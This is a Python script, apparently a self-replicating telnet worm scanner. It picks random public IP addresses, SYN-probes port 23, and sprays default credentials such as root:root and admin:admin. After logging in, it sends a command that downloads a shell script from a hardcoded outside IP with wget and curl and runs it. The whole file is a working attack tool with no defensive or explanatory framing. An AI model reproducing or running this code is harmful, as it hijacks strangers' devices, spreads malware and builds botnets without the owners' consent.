import telnetlib, getpass, sys, os, random
from scapy.all import *

credential = ["root:toor", "root:root", "admin:1234", "admin:admin", "guest:guest"]
        
cmd_infect = 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.89.200.158/bins.sh; curl -O http://23.89.200.158/bins.sh; chmod 777 bins.sh; sh bins.sh'
    
    
def gen_ip():
    _ip = ''

    blacklist = ["127.0", "10.0", "192.168"]
        
    while True:
        _ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        _ok = True
        for ip_avoid in blacklist:
            if _ip.startswith(ip_avoid):
                _ok = False
                _ip = ''
                    
        if _ok == True:
            return _ip
            
def reset_socket(_ip):
    try:
        rst = IP(dst=_ip)/TCP(dport=int(23), flags="R")
        send(rst, verbose=False)
    except:
        pass
            
def main():
    os.system('clear')

    print("""
  _____    _          _     ___
 |_   _|__| |_ _  ___| |_  / __| __ __ _ _ _  _ _  ___ _ _
   | |/ -_) | ' \/ -_)  _| \__ \/ _/ _` | ' \| ' \/ -_) '_|
   |_|\___|_|_||_\___|\__| |___/\__\__,_|_||_|_||_\___|_|
""")
    global credential, cmd_infect
    
    # generate random endpoint
    while True:
        new_ip = gen_ip()
    
        # probe w/ syn-stealth
        try:
            print(f'Scanning {new_ip}...')
        
            # craft packet / send probe
            response = sr1(IP(dst=new_ip)/TCP(dport=int(23), flags="S"), timeout=int(2), verbose=0)
            
            # if ack captured
            if response and response.haslayer(TCP):
                if response[TCP].flags == 0x12:
                    
                    print(f'Telnet active @ {new_ip}:23  ---  now cracking!\r\n')
                    
                    for userpass in credential:
                        try:
                            print(f'    Spraying login with credential: {userpass}')
                        
                            user, password = userpass.split(':')
                        
                            # setup telnet connection
                            tn = telnetlib.Telnet(new_ip, 23)
                            
                            # wait for login prompt
                            tn.read_until(b"login: ", timeout=3)
                        
                            # send the username
                            tn.write(user.encode('ascii') + b"\n")
                            
                            # wait for password prompt
                            tn.read_until(b"Password: ", timeout=3)
                            
                            # send the password
                            tn.write(password.encode('ascii') + b"\n")
                            
                            # Wait for the shell prompt
                            tn.read_until(b"$ ", timeout=3)
                            
                            # send SELF-REP command
                            tn.write(cmd_infect.encode('ascii') + b"\n")
                            
                            #tn.close()
                            
                            break
                        except KeyboardInterrupt:
                            sys.exit('\r\nAborted\r\n')
    
        except KeyboardInterrupt:
            sys.exit('\r\nAborted\r\n')
        except:
            pass
        finally:
            # close the hanging socket with a RST
            reset_socket(new_ip)
            
if __name__ == '__main__':
    main()
